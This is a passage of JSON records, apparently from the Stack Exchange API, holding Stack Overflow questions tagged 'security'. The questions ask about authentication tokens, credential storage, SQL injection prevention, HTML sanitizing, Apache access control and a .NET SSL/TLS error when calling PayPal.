github?</a></p>\n"},{"tags":["security","asp.net-mvc-4","asp.net-web-api"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":117,"score":1,"question_id":12551479,"title":"Can / Should I use SWT or SAML tokens for MVC 4 WebAPI project?","body":"<p>I have setup my ACS in Azure.\nI have created a MVC 4 WebAPI Project.\nI have added \"Identity and Access\" in visual studio 2012.</p>\n\n<p>This are running. but when i lauch the application i get the following:\nID4014: A SecurityTokenHandler is not registered to read security token ('BinarySecurityToken', 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd').</p>\n\n<p>The problem is that i told ACS to use SWT instead of SAML 2.0. From what I have seen in guides about securing a restfull wep api, swt was the way to go. </p>\n\n<p>If i change to SAML 2.0 it all works in the web interface. But how will this work out when i write a client for Windows Store (Metro) or other clients to get data from the WebAPI part of the project?</p>\n\n<p>Any advice to continue. Should I use SWT, and how do it make it work. Should I use SAML 2.0 and what should i then handle the authenticaitno later in a Windows Store Client?</p>\n"},{"tags":["javascript","asp.net-mvc","security","plugins","webbrowser"],"answer_count":1,"favorite_count":2,"up_vote_count":31,"down_vote_count":1,"view_count":585,"score":30,"question_id":9418891,"title":"How do I integrate Perfidies (Browser plug-in vulnerability scanner) into my website?","body":"<p><a href=\"https://github.com/ozten/Perfidies-of-the-Web/tree\">Perfidies</a> / <a href=\"https://github.com/lmorchard/plugindir\">Plugindir</a> is the client to <a href=\"https://wiki.mozilla.org/PFS2#Codebases\">Mozilla's plugin vulnerablity database</a>.  I think a variant of this is used here on <a href=\"http://www.mozilla.org/en-US/plugincheck/\">this site geared for end users</a>.</p>\n\n<p>I would like to redirect any browser that is using an old version of Java, Silverlight, Flash, etc to a \"quarantine\" page asking them to upgrade their browser before they are permitted to log in.</p>\n\n<ul>\n<li><p>What technical changes do I need to make to accomplish this?</p></li>\n<li><p>What Perfidies specific javascript objects must I become aware of?</p></li>\n<li><p>Are there any deployment concerns or modifications I should make?</p></li>\n</ul>\n\n<p>...\n...</p>\n"},{"tags":["web-services","security","authentication","credentials"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12628921,"title":"What's a smart way of storing user credentials for an external site (that does not use OAuth)?","body":"<p>I realize that in general, you should not store user credentials directly (i.e., in plain text); rather, it is best to store some encrypted form of them.</p>\n\n<p>However, suppose I create a website that interacts with some other 3rd party site; and let's say this 3rd party site offers an API that requires the user's credentials (with that site) for authentication.</p>\n\n<p>If my goal is to, say, provide a superior UI or introduce additional functionality on top of the services provided by this 3rd party, then it seems to me I need to actually store the user's credentials somehow so that I can use the APInot the user's password for <em>my</em> site (I can hash &amp; salt that one), but for the external site.</p>\n\n<p>Is there a \"right\" way to do this? My initial thinking is to store the credentials encrypted in some form such that they can be decrypted on the server for purposes of making API calls to the 3rd party service. This would mean that an attacker would need to understand how the encryption/decryption works in order to steal the user's external passwords. However, that does not seem so far-fetched to me; a clever hacker who had already breached the server hosting my application would probably be able to get at the code and figure it out pretty easily.</p>\n\n<p>So, that approach seems like better than nothing but not exactly great. Are there other strategies that people use? Is this entire concept (interacting with a 3rd party service requiring user credentials) ill-advised?</p>\n\n<p>I have to believe there is at least some reasonably secure way of dealing with this situation since it seems relatively common among even some fairly high-profile websites (e.g., Mint.com).</p>\n\n<p><strong>Update</strong>: Just to clarify: I am aware that in an ideal world, the 3rd party service would implement some version of OAuth (or an equivalent) so that I would not have to store credentials. Unfortunately, the reality in this case is that the 3rd party service requires user name and password to be sent in every API request. So is the consensus that I'm hearing, then, that in this case most developers would just refuse to use the service (and most likely suggest to them that they implement OAuth)?</p>\n"}]}
{"total":17772,"page":12,"pagesize":100,"questions":[{"tags":["security","login"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12620124,"title":"Admin access through a GET parameter","body":"<p>I'm working on a really simple web site. I usually do a full blown admin to edit the site, but this time I thought about editing in place (contenteditable=\"true\").</p>\n\n<p>To simplify login for the user, I'd like to just give him a password that he can type in the address bar to log him in, instead of the usual login form. So he would visit domain.com/page?p=the_password and then I would store his data in a session and give him a cookie with a session id (usual stuff) and redirect him to domain.com/page.</p>\n\n<p>How safe / unsafe is this? I'm doing this in PHP, but I guess it applies to any server-side language.</p>\n"},{"tags":["security","ldap","client-server","hard-coding"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12596240,"title":"How can I connect to LDAP from a smartphone without hardcoding the password?","body":"<p>Our Android app connects to an LDAP db for authentication and user data (email address, phone number, etc.). Until now, the app has connected to a piece of middleware that opens the connection to LDAP and performs operations for the app. The app just sends a basic request (like \"Authenticate the user, and grant them the role if they don't have it\"), and the middleware is set up to handle only those possible requests.</p>\n\n<p>Now, we've been asked to skip the middleware, and connect to LDAP straight from the app. The issue is that, as far as I can see, there's no way to <em>not</em> hardcode the password of the master LDAP user in the app, and I know .apk files are easy to decompile.</p>\n\n<p>Is there any way to securely connect directly to the LDAP from a client app on phones belonging to the general public without using middleware?</p>\n"},{"tags":["python","security","hash","md5"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":106,"score":6,"question_id":12592501,"title":"Serialize MD5 computation-state and resume later?","body":"<p>I want to serialize/deserialize md5 context. But I don't know how to do it in Python.\nPseudocode of what I want to do.</p>\n\n<pre><code>import md5\n# Start hash generation\nm = md5.new()\nm.update(\"Content\")\n\n# Serialize m\nserialized_m = serialize(m)\n\n# In another function/machine, deserialize m\n# and continue hash generation\nm2 = deserialize(serialized_m)\nm2.update(\"More content\")\nm2.digest()    \n</code></pre>\n\n<p>There are C++ libraries for this. Is there one for Python? Why doesn't the md5 library support it? Are there security concerns? Thanks.</p>\n\n<p>Edited:\nI want to do this because for example, an HTTP server wants to accept streaming data in different HTTP requests. It would be convenient to serialize md5 context somehow between requests.</p>\n"},{"tags":["security",".htaccess","joomla"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":852,"score":3,"question_id":722973,"title":"Is it a security risk not to use a .htaccess file?","body":"<p>I have a Joomla site www.siteA.com and another Joomla site www.siteA.com/siteB.</p>\n\n<p>I have a .htaccess -file at siteA, but not at siteB.</p>\n\n<p><strong>Is it a security risk not to have a .htaccess -file at siteB?</strong></p>\n"},{"tags":["security","rsa","keytool"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12605467,"title":"generated a rsa key with keytool - where is it?","body":"<p>I created a RSA key pair using keytool, but I need to get the public key.\nI've read all around but can't find this information anywhere. </p>\n\n<p>Is there a way to get that information? Or even where are the files located in windows 7?</p>\n\n<p>Any suggestion will help..</p>\n\n<p>thanks!</p>\n"},{"tags":["php","html","css","security","codeigniter"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12623373,"title":"Apart from SQL injection what other security vulnerabilities should I be aware of in a website?","body":"<p>I generally work using the codeigniter framework, which provides some help with preventing sql injection, e.g. xss clean of form input data. </p>\n\n<p>I have a basic idea of what sql injection is and how to stop it happening, but a friend of mine has a very basic site in which the only user input was a cgi form to email script - parts of the site were replaced with some adult content.</p>\n\n<p>So I am curious how someone could have gained control of such a basic site and also, what kind of vulnerabilities I should be aware of when building my own sites?</p>\n"},{"tags":["java","security","properties"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12610255,"title":"Set a Java Security Property to null","body":"<p>I have seen that one can null (or clear) a System property by using <code>System.clearProperty(\"propertyName\")</code>.  However, I am unable to locate a similar mechanism for Security.</p>\n\n<p>How does one perform the equivalent of <code>Security.clearProperty(\"propertyName\")</code>?  </p>\n\n<p>Obviously, using <code>Security.setProperty(\"propertyName\", null)</code> does not work for the same reasons it does not work for <code>System.setProperty(\"propertyName\", null)</code>.</p>\n\n<p>I would like to do this as there are optional security properties that may not be updated when required properties are changed.  I would like the optional properties to reset to their default values when a change is made to the required properties.</p>\n"},{"tags":["php","security","pdo","sql-injection"],"answer_count":7,"favorite_count":54,"up_vote_count":69,"down_vote_count":1,"view_count":15846,"score":68,"question_id":134099,"title":"Are PDO prepared statements sufficient to prevent SQL injection?","body":"<p>Let's say I have code like this:</p>\n\n<pre><code>$dbh = new PDO(\"blahblah\");\n\n$stmt = $dbh-&gt;prepare('SELECT * FROM users where username = :username');\n$stmt-&gt;execute( array(':username' =&gt; $_REQUEST['username']) );\n</code></pre>\n\n<p>The PDO documentation says</p>\n\n<blockquote>\n  <blockquote>\n    <blockquote>\n      <blockquote>\n        <p>The parameters to prepared statements don't need to be quoted; the driver handles it for you.</p>\n      </blockquote>\n    </blockquote>\n  </blockquote>\n</blockquote>\n\n<p><strong>Is that truly all I need to do to avoid SQL injections?  Is it really that easy?</strong></p>\n\n<p>You can assume MySQL if it makes a difference.  Also, I'm really only curious about the use of prepared statements against SQL injection.  In this context, I don't care about XSS or other possible vulnerabilities.</p>\n"},{"tags":["wordpress","security","http","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12621656,"title":"HTTPS to HTTP Redirect for one folder","body":"<p>I have a problem where I have a site that was HTTPS enabled in areas for secure content, but also has a wordpress blog at /blog/</p>\n\n<p>This all works fine, and theres no REAL problem, but to be on the safe side of things, if someone accessed with /blog/ folder using https (they would have to manually type <a href=\"https://domain.com/blog/\" rel=\"nofollow\">https://domain.com/blog/</a>) it breaks alot of the content in the blog.</p>\n\n<p>I want to set up a rewrite rule in the .htaccess to send any https requests on the /blog/ folder to http</p>\n\n<p>Is this possible?</p>\n"},{"tags":["java","security","xss","sanitization","owasp"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12558471,"title":"How to allow specific characters with OWASP HTML Sanitizer?","body":"<p>I am using the OWASP Html Sanitizer to prevent XSS attacks on my web app. For many fields that should be plain text the Sanitizer is doing more than I expect. </p>\n\n<p>For example: </p>\n\n<pre><code>HtmlPolicyBuilder htmlPolicyBuilder = new HtmlPolicyBuilder();\nstripAllTagsPolicy = htmlPolicyBuilder.toFactory();\nstripAllTagsPolicy.sanitize('a+b'); // return a&amp;#43;b\nstripAllTagsPolicy.sanitize('foo@example.com'); // return foo&amp;#64;example.com\n</code></pre>\n\n<p>When I have fields such as email address that have a <code>+</code> in it such as <code>foo+bar@gmail.com</code> I end up with the wrong data in the the database. So two questions: </p>\n\n<ol>\n<li>Are characters such as <code>+ - @</code> dangerous on their own do they really need to be encoded? </li>\n<li>How do I configure the OWASP html sanitizer to allow specific characters such as + - @?</li>\n</ol>\n\n<p><strong>Question 2 is the more important one for me to get an answer to.</strong> </p>\n"},{"tags":["apache2","security","database","access-control"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12621185,"title":"Apache deny access to images folder, but still able to display via <img> on site","body":"<p>I have an images folder on my site, let's call it <code>/images/</code> where I keep a lot of images.  I don't want anyone to have direct access to the images via the web, so I put a new directive in my Apache config that achieves this:</p>\n\n<pre><code>&lt;Directory \"/var/www/images/\"&gt;\n    Options Includes\n    AllowOverride All\n    Order allow,deny\n    Deny from All\n&lt;/Directory&gt;\n</code></pre>\n\n<p>This is working, but it is blocking out ALL ACCESS, and I can't show the images anymore through my web pages.  I guess this makes sense.  So how do I selectively control access to these images?  </p>\n\n<p>Basically I only want to display certain images through certain webpages and to certain users.  What is best way to do this?  Do I need to save the images to the database?</p>\n\n<p>Tim</p>\n"},{"tags":["php","mysql","security","injection"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":1,"view_count":83,"score":3,"question_id":12606193,"title":"Is this string replacement enough against SQL injection attacks?","body":"<p>I'm trying to evaluate a sort of customized <code>CMS</code>. The protection the devoloper used against <code>SQL</code> attacks is:</p>\n\n<pre><code> str_replace(\"'\", \"\\'\", $_POST[$variable]);\n</code></pre>\n\n<p>Is this good enough, or there're ways to exploit this to inject <code>SQL</code> code?</p>\n\n<p>PS: I know the standard way is using <code>mysql_real_escape_string()</code>, but I'm trying to get an idea of the general quality of the code. </p>\n"},{"tags":["security","desktop-recording"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12615617,"title":"Prevent screen capture software from monitoring input fields","body":"<p>The obstacle I am trying to overcome is with screen recording software that monitors the computer while in use. Workstations use common technologies like RDP and Citrix XenApp. There are a few details which should be seen by the user via a browser window input fields but are best left unrecorded. Physical attacks aside, is there any standard way of handling this?</p>\n\n<p>I did question printing said information and using stylesheets to hide it from the screen, but this really isn't a viable option.</p>\n"},{"tags":["ruby-on-rails","security","deployment"],"answer_count":5,"favorite_count":9,"up_vote_count":29,"down_vote_count":0,"view_count":7148,"score":29,"question_id":18290,"title":"How Do You Secure database.yml?","body":"<p>Within Ruby on Rails applications database.yml is a plain text file that stores database credentials.</p>\n\n<p>When I deploy my Rails applications I have an after deploy callback in my Capistrano \nrecipe that creates a symbolic link within the application's /config directory to the database.yml file. The file itself is stored in a separate directory that's outside the standard Capistrano /releases directory structure. I chmod 400 the file so it's only readable by the user who created it.</p>\n\n<ul>\n<li>Is this sufficient to lock it down? If not, what else do you do?</li>\n<li>Is anyone encrypting their database.yml files?</li>\n</ul>\n"},{"tags":["database","security","web-applications"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12613906,"title":"Data security in web application hosted on internet","body":"<p>I'm plannig to host an application on Internet which allows corporates to enter employees personal data and create some reports. Since there would be personal information I want the each corporate account admin to configure database connection details when the account is created and the application will store the information in that database for the respective account. The user will configure their firewall to accept connection from the server where my application is hosted and obviously assumes the responsibility of data security. I'm thinking about this idea to avoid any issues with security attacks. This may sound totally dumb but I want opinion from others. Feel free to provide your comments.</p>\n"},{"tags":["security","encoding","xor"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":192,"score":2,"question_id":10645705,"title":"XOR encrypting and decryption key","body":"<p>It is possible to get the key used to encrypt a secuence of characters using xor?</p>\n\n<h1>Example</h1>\n\n<p>Lets say that I Have the following string: 1456, so:</p>\n\n<ul>\n    <li>1 - 49 ascii - 00110001 binary</li>\n    <li>4 - 52 ascii - 00110100 binary</li>\n    <li>5 - 53 ascii - 00110101 binary</li>\n    <li>6 - 54 ascii - 00110110 binary</li> \n</ul>\n\n<p>Key: 100</p>\n\n<p>Then I do the following: 1 ^ 100 (talking in binary: 00110001 ^ 01100100), and get the following result: \"UPQR\", how do I know that I used the key 100 in xor to encrypt \"1456\" getting \"UPQR\" as the result.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["asp.net","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12611183,"title":"Is a WebService call containing a Username and Password any less secure than logging into a site?","body":"<p>We created a site for a customer a while back that has no site certificate/SSL.  It's just got a basic asp_net login system.</p>\n\n<p>You can't buy anything from the site and it doesn't hold personal details - it just shows the stock and gives the users a telephone number where they can phone up and buy the stock. </p>\n\n<p>One of our users has their own system and wants to grab bits of info via a WebService - we'd intended to just put a WebService with a WebMethod that took Username, Password and an ID and then passed some info back to their system.</p>\n\n<p>One of the developers says this would make the system much less secure as the WebMethod call with the Username and Password is much less secure than the login system on the site.  </p>\n\n<p>Is this WebMethod call really any less secure than the login system on the site?</p>\n"},{"tags":["windows","security","store","secret"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12602234,"title":"Is there any more securely way to protect and store a password than Windows DPAPI do?","body":"<p>Is there any more securely way to protect and store a password than Windows DPAPI do?</p>\n\n<p>My program needs to store a secret (something like credentials) to do automatic logins on Windows, and this secret have to be shared with other users accounts because the program can be run on different accounts but sharing the credentials.</p>\n\n<p>I need to protect this secret from tampering to avoid an attacker to inject his own credentials and take the control. If the attacker has phisical access I know that there is nothing we can do, but.... currently, what is the best way to store and protect this secret?</p>\n"},{"tags":["asp.net","web-services","security"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12610217,"title":"What is the risk of someone eavesdropping on a webservice when it's being called by its own server?","body":"<p>Our company website is made up of several .NET projects all on the same server in addition to the big main site in ColdFusion. To reduce code duplication we wrote a webservice that these projects can call for basic functions. For example we have a service were you give it a user ID you get back some information about the user (no passwords, but things like an address). What I am concerned about is someone poking their electronic nose in and catching some information we don't want them to have. Is this a valid concern or will the information from the webservice stay internal since it and the projects calling it are on the same server? </p>\n\n<p>So our webservices are all like www.companyname.com/webservices/webserviceuser.asmx and the .NET web projects are all like www.companyname.com/admin/project1/ or www.companyname.com/edituser/ Since they all share the same domain name, will the information get out to the general internet?</p>\n\n<p>Also is it possible to add security to the webservice to confirm that the caller is an internal application (even if it's just testing the URL of the page calling it)?</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["java","security","rest","ssl"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12610356,"title":"SSL and authenticating users","body":"<p>I have a REST API which clients connect over SSL (self signed cert 2048bit)</p>\n\n<p>I was thinking of implementing the following security </p>\n\n<ol>\n<li>The client requests a RSA public key from the server</li>\n<li>Encrypts the username / password </li>\n<li>Adds these to the header of EVERY REST call allowing the server to be stateless </li>\n</ol>\n\n<p>The application involves users adding credit cards (the numbers themselves are encrypted) and purchasing products so security is critical </p>\n\n<p>We also have very limited time from a iphone client point of view so I was hoping if the above would be suitable? </p>\n"},{"tags":["java","security","java-ee","web-security","srp-protocol"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12148144,"title":"Secure Remote Password protocol on application level","body":"<p>I'm writing a Java EE application, which allows new users to register themselves and then log in over the Internet. I'm storing the credentials an a db.</p>\n\n<p>Now, there are several ways to do that, e.g.:</p>\n\n<ul>\n<li>send username and password, preferably over a TLS/SSL connection</li>\n<li>send username and a hashcode of the password, preferably over a TLS/SSL connection</li>\n<li>use the Secure Remote Password protocol (preferably over a TLS/SSL connection ?)</li>\n</ul>\n\n<p>Reading some articles, it seems the Secure Remote Password Protocol (SRP) is the way to go.</p>\n\n<p>But then reading some other articles it seems as this is only used on some low-level layers, e.g. such as TLS/SSL itself.</p>\n\n<p>I still think, it's recommended to use the Secure Remote Password Protocol on application level.</p>\n\n<p>Is this correct? Or are there some good reasons why this is not needed on application level?</p>\n"},{"tags":["javascript","security","backbone.js","ember.js"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":12606053,"title":"Securing UI in a one page js application","body":"<p>Let me start off by saying that I do understand that one should never attempt to secure anything in javascript on the client side.  My question is referring to UI that some users would see and others would not.  Usually this UI also has some sort of logic bound to it.  Whether it be Backbone or Ember, what are some of the normal practices for showing or hiding different parts of the UI depending on user roles.</p>\n\n<p>My initial thought was to load different js depending on the currently signed in user.  On top of this, loading view templates async also came to mind.  I would love to hear other ideas and patterns though.  Keep in mind that this is assuming the backend API that the client communicates with is already secure for the given user.  So even if they were to view a secure UI component, it would not work correctly.</p>\n"},{"tags":["java","security","encryption","cryptography","sha-1"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":75,"score":0,"question_id":12577737,"title":"sha1 encryption with passPhrase ,saltValue,passwordIterations,initVector,keySize","body":"<p>I'm developing java application and I was asked to generate secure code using following information.</p>\n\n<pre><code>Value to be encrypted =\"test1234\";\n\npassPhrase = \"testValue\"\nsaltValue  = \"testValue\"\nhashAlgorithm = \"SHA1\"\npasswordIterations = 2\ninitVector = \"testValue\"\nkeySize = 256\n</code></pre>\n\n<p>Could some one kindly let me know what is the approach to generate hash value using SHA1 algorithm based on above mention values.</p>\n"},{"tags":["javascript","security","web-applications"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12605366,"title":"Verifying the validity of the data sent from WebApp to Web Service","body":"<p>I am building a WebApp which connects to my server through a web service.\nUsers (there is no login) which use the webapp can send their scores to the\nserver.</p>\n\n<p>The code is written mostly in javscript, so anyone can read it.</p>\n\n<p>As I know there is no 100% gurantee method of doing this, I am just looking for ideas\nhow to make it as hard as possible for users to send false scores.</p>\n\n<p>Ideas?\n10X! </p>\n\n<p><em><strong>EDIT</em></strong></p>\n\n<p>The server side web service is an asmx (.net) web service hosted on an IIS.\nI can modify it as needed.</p>\n"},{"tags":["security","http","rest","asp.net-web-api","restful-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":102,"score":3,"question_id":12606423,"title":"How to send secure token from RESTful service?","body":"<p>I am building a RESTful service using ASP.NET Web API with custom token based authentication. The client will send credentials on the first call. The service will create an encrypted token using the user details and this token will be used for authentication from this point onwards. Now the service needs to send this token back to the client. Initially I kept the token in a HTTP custom response header so that the client can read the value independent of the data returned by the service. This worked well when client and service are in the same domain, but failed in Cross domain scenario. I have CORS enabled my Service and added all kinds of headers like  \"Access-Control-Expose-Headers\", \"Access-Control-Allow-Origin: *\" etc. But the cross domain client is not able to read the custom response header I created which is \"SecureToken:\". I saw in couple of posts that web browsers have some issues with reading custom response headers in cross domain scenarios. So now I am thinking of sending the secure token through a common base class of all the ViewModel/data objects sent from the service. </p>\n\n<p>From this context I have couple of questions:</p>\n\n<ol>\n<li><p>What is the best place to send custom secure tokens. Is it in response header or as a common property in the base class of the ViewModel/data classes? </p></li>\n<li><p>is there a standard HTTP response header that I can use to send token and custom information so that even cross domain clients can also read it?  </p></li>\n</ol>\n\n<p>Any help will be greatly appreciated! Thanks!</p>\n"},{"tags":["security","client-side"],"answer_count":8,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":1186,"score":9,"question_id":1380168,"title":"Does it make security sense to hash password on client end","body":"<p>If you were to hash a user's password prior to sending it across the line and leaving it in plain-text in memory, would this improve the security of the application?</p>\n\n<p>I would assume this mitigates a small fraction of vulnerabilities by protecting the data stored in the clients memory.  But really if we're worried about someone reading the client's memory there are probably bigger problems that we can't address.</p>\n\n<p>There's something that doesn't feel right about hashing on the client's end.</p>\n\n<p>Is password hashing on the client end a common practice?  Are there any other advantages or disadvantages to doing it?</p>\n\n<p>EDIT:\nGiven the communication channel is secure (SSL).  Under what conditions would it be acceptable and worthwhile to use such an approach.   I'm asking this because it was suggested by a \"security professional\" that I use such a scheme during some application functions.</p>\n"},{"tags":[".net","security","ssl","certificate"],"answer_count":2,"favorite_count":2,"up_vote_count":9,"down_vote_count":0,"view_count":1538,"score":9,"question_id":9242724,"title":"SSL Failures - Recieving SSL/TLS exception when using HttpWebRequest with client certificate","body":"<p>I have a Windows 2008 Server with IIS 7 which using a .NET C# Application to send requests to PayPal to process payments. A few months ago I installed a Certificate which was purchased by Verisign. After installation, I was able to run my WebClient code to create SSL Connections successfully, and process payments via the PayPal NVP API (Name Value Pair). </p>\n\n<p>Recently, I have been receiving an error during SSL Transaction. The specific error is as follows:</p>\n\n<p><strong>Could not create SSL/TLS secure channel</strong></p>\n\n<p>I've checked everything I could think of, and read many articles on StackOverflow and other places on the net.</p>\n\n<p>The best resource I found was this:</p>\n\n<p>The request was aborted: Could not create SSL/TLS secure channel</p>\n\n<p>Lookup the error in this article <a href=\"http://support.microsoft.com/kb/915599\">http://support.microsoft.com/kb/915599</a>  Resolution J.  It also may be that you are not supplying a client certificate.  Most likely this is an issue with TLS or SSL3 being used and the server not understanding it.</p>\n\n<p><a href=\"http://blogs.msdn.com/b/jpsanders/archive/2009/01/07/you-receive-one-or-more-error-messages-when-you-try-to-make-an-http-request-in-an-application-that-is-built-on-the-net-framework-2-0.aspx\">http://blogs.msdn.com/b/jpsanders/archive/2009/01/07/you-receive-one-or-more-error-messages-when-you-try-to-make-an-http-request-in-an-application-that-is-built-on-the-net-framework-2-0.aspx</a></p>\n\n<p>And here is a list of all the other resources I've tried reading and implimenting their solutions:</p>\n\n<p><strong>Various Links I've Tried:</strong></p>\n\n<p><a href=\"http://support.microsoft.com/kb/901183\">http://support.microsoft.com/kb/901183</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/1600743/could-not-create-ssl-tls-secure-channel-could-the-problem-be-a-proxy-server\">Could not create SSL/TLS secure channel - Could the problem be a proxy server?</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/5353771/the-request-was-aborted-could-not-create-ssl-tls-secure-channel\">The request was aborted: Could not create SSL/TLS secure channel</a></p>\n\n<p><a href=\"http://stackoverflow.com/questions/8692532/the-request-was-aborted-could-not-create-ssl-tls-secure-channel-decrypt-retur\">The request was aborted: Could not create SSL/TLS secure channel - Decrypt returned SEC_I_RENEGOTIATE</a></p>\n\n<p><a href=\"http://social.msdn.microsoft.com/forums/en-US/netfxnetcom/thread/99d49286-5c3a-4311-a1e3-499f035ce979/\">http://social.msdn.microsoft.com/forums/en-US/netfxnetcom/thread/99d49286-5c3a-4311-a1e3-499f035ce979/</a></p>\n\n<p><a href=\"http://blogs.msdn.com/b/jpsanders/archive/2009/01/07/you-receive-one-or-more-error-messages-when-you-try-to-make-an-http-request-in-an-application-that-is-built-on-the-net-framework-2-0.aspx\">http://blogs.msdn.com/b/jpsanders/archive/2009/01/07/you-receive-one-or-more-error-messages-when-you-try-to-make-an-http-request-in-an-application-that-is-built-on-the-net-framework-2-0.aspx</a></p>\n\n<p><a href=\"http://forums.iis.net/t/1156690.aspx\">http://forums.iis.net/t/1156690.aspx</a></p>\n\n<p><strong>I have tried the following solutions:</strong></p>\n\n<ol>\n<li>Reinstall the certificate, and placed it into various stores (Personal, LocalComputer)</li>\n<li><p>Added this ServiceManager code:</p>\n\n<pre><code>ServicePointManager.Expect100Continue = true;\nServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3;\n</code></pre></li>\n<li><p>Enabled logging to gain more verbose details</p></li>\n<li>Various other solutions listed in the above links</li>\n</ol>\n\n<p>What is so frustrating is that this was working fine a few months ago, and now I receive this error. At first, I thought the cert expired, but it appears to be fine.</p>\n\n<p>It could be a Service Pack or Hotfix for Windows Server has created a new setting or scenario which breaks SSL. I figured that re-installing the cert would solve that. </p>\n\n<p>It is important to note that when I reinstalled, I simply added it to the various stores (Double Click the cert and install). I did not create a \"Certificate Request\". Since its already installed and bound to the SSL Port of my IIS Application, it should be ok.</p>\n\n<p><strong>This is the code that creates the web request:</strong> </p>\n\n<pre><code>     public static Hashtable DoWebReq(string strNVP, string strNVPSandboxServer)\n    {\n        ServicePointManager.Expect100Continue = true;\n        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3;\n\n        string _strNVP = strNVP; \n\n        //Create web request and web response objects, make sure you using the correct server (sandbox/live)\n        var wrWebRequest = (HttpWebRequest)WebRequest.Create(strNVPSandboxServer);\n        wrWebRequest.Method = \"POST\"; // POST\n\n        var requestWriter = new StreamWriter(wrWebRequest.GetRequestStream());\n\n\n        requestWriter.Write(_strNVP);\n        requestWriter.Close();\n\n        // Get the response.\n        var hwrWebResponse = (HttpWebResponse)wrWebRequest.GetResponse();\n        var responseReader = new StreamReader(wrWebRequest.GetResponse().GetResponseStream());\n\n        //and read the response\n        string responseData = responseReader.ReadToEnd();\n        responseReader.Close();\n\n        string result = System.Web.HttpContext.Current.Server.UrlDecode(responseData);\n\n        string[] arrResult = result.Split('&amp;');\n        Hashtable htResponse = new Hashtable();\n        string[] responseItemArray;\n        foreach (string responseItem in arrResult)\n        {\n            responseItemArray = responseItem.Split('=');\n            htResponse.Add(responseItemArray[0], responseItemArray[1]);\n        }\n\n        return htResponse; \n    }\n</code></pre>\n\n<p><strong>Here are a collection of screen shots to show the various components of the SSL Machine:</strong></p>\n\n<p>This is the SSL Binding Settings in IIS:\n<img src=\"http://i.stack.imgur.com/6f1ER.jpg\" alt=\"SSL Bindings\"></p>\n\n<p>Here is an overview of the installed Certs:\n<img src=\"http://i.stack.imgur.com/9NSBx.jpg\" alt=\"certs1\"></p>\n\n<p>This is the Error I receive:\n<img src=\"http://i.stack.imgur.com/qupnX.jpg\" alt=\"SSL Error\"></p>\n\n<p><img src=\"http://i.stack.imgur.com/KYAQ4.jpg\" alt=\"certs2\"></p>\n\n<p>Certs Installed:\n<img src=\"http://i.stack.imgur.com/P8TOA.jpg\" alt=\"enter image description here\"></p>\n\n<p>Certificate Details\n<img src=\"http://i.stack.imgur.com/SMaZ8.jpg\" alt=\"enter image description here\"></p>\n\n<p>Any advice on fixing this error would be most appreciated. Some possibilities I've considered but not addressed are:</p>\n\n<ol>\n<li>Could the request be taking too long? It seems fast enough... but I've read this could be a problem.</li>\n<li>In Internet Explorer, I do see the Green \"SSL Bar\" which shows this site is verified as being secure. This tells me the Cert is installed correctly, is this true?</li>\n<li>Is there a simple test I can perform with a HTTP request of some kind to help narrow down the source of the problem?</li>\n<li>Could this have anything to do with PayPal? Is it possible paypal is rejecting the request due to credentials on their end? </li>\n<li>Would implementing an <a href=\"http://msdn.microsoft.com/en-us/library/k8z4ffe4%28vs.71%29.aspx\">ICertificatePolicy Interface</a> be of any help in debugging the issue? I'm hoping I can just fix it.</li>\n</ol>\n\n<p>I would think that either the SSL would work or not, it has no bearing/dependency on PayPal at all... but I could be wrong.</p>\n\n<p>I feel like I should be able to just use the Name Value Pair URL which is built by the WebClient class, and send that over the pipe via IE and receive a response.</p>\n\n<p>Thank you very much for taking a 